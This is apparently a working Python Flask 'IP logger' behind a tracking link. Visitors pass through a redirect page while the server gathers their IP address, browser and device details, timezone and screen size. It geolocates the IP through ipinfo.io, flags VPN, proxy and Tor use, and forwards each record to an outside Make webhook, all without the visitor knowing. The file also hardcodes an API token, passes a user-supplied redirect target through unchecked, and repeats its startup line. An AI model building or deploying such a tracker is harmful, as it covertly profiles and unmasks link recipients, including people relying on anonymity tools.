from flask import Flask, request, render_template, redirect, send_from_directory
from datetime import datetime
import requests
import json
import os

app = Flask(__name__)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
MAKE_WEBHOOK = os.environ.get("MAKE_WEBHOOK")
REDIRECT_URL = os.environ.get("TRACK_URL")
IPINFO_TOKEN = "cb4dd6c6220e6e"

@app.route('/')
def home():
    return redirect("/track?goto=" + REDIRECT_URL)

@app.route('/track')
def track():
    goto = request.args.get("goto", REDIRECT_URL)
    return render_template("redirect.html", goto=goto)

@app.route('/collect', methods=['POST'])
def collect():
    js_data = request.get_json()

    # ========== استخراج أدق IP ==========
    ip = (
        request.headers.get("CF-Connecting-IP") or
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
        request.remote_addr
    )

    user_agent = request.headers.get('User-Agent', '')
    language = request.headers.get('Accept-Language', '')

    # ========== تحليل ipinfo ==========
    try:
        geo_response = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}", timeout=5)
        geo_response.raise_for_status()  # تأكيد نجاح الطلب
        geo = geo_response.json()
        print("[IPINFO Raw]", geo)  # طباعة محتوى الرد لاختبار الدقة

        city = geo.get("city", "N/A")
        region = geo.get("region", "N/A")
        country = geo.get("country", "N/A")
        org = geo.get("org", "N/A")

        privacy = geo.get("privacy", {})
        is_vpn = privacy.get("vpn", False)
        is_proxy = privacy.get("proxy", False)
        is_tor = privacy.get("tor", False)

    except Exception as e:
        print("[IPINFO ERROR]", str(e))
        city = region = country = org = "N/A"
        is_vpn = is_proxy = is_tor = False

    # ========== بيانات الجافا سكربت ==========
    platform = js_data.get("platform", "")
    timezone = js_data.get("timezone", "")
    local_time = js_data.get("localTime", "")
    screen = js_data.get("screen", "")

    # ========== دمج البيانات ==========
    data = {
        "ip": ip,
        "userAgent": user_agent,
        "language": language,
        "platform": platform,
        "timezone": timezone,
        "localTime": local_time,
        "screen": screen,
        "location": {
            "ip": ip,
            "country": country,
            "city": city,
            "region": region,
            "org": org,
            "isVPN": is_vpn,
            "isProxy": is_proxy,
            "isTor": is_tor
        },
        "timestamp": datetime.now().isoformat()
    }

    # ========== إرسال إلى Make ==========
    if MAKE_WEBHOOK:
        try:
            requests.post(MAKE_WEBHOOK, json=data, timeout=3)
        except Exception as e:
            print("[Webhook Error]", e)

    print("[Visitor Data]", json.dumps(data, indent=2))
    return '', 204

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
    app.run(host='0.0.0.0', port=port)
